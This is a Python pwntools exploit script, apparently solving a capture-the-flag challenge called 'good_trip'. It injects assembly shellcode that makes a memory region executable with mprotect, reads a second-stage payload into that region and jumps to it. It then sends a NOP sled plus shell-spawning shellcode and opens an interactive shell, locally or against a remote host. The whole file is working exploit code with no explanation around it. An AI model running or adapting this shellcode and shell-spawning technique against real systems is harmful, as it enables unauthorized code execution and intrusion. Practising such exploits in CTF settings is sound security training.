#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('good_trip')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *exec+64
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():
    mprotect = exe.plt['mprotect']
    new_region = 0x4040d0
    read = exe.plt['read']

    sc = asm(f"""
        start:
            mov rsp, {new_region}
            mov rdx, 7
            mov rsi, 0x1000
            movabs rdi, 0x1337131000
            mov rax, {mprotect}
            call rax
            nop
            nop
            mov rdi, 0
            mov rsi, 0x1337131000+0x200
            mov rdx, 0x100
            mov rax, {read}
            call rax
            jmp rsi
    """)

    io.sendline(str(len(sc)))
    io.sendline(sc)

    sh = asm("nop")*30 + asm(shellcraft.sh())
    io.sendline(sh)

    io.interactive()


def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

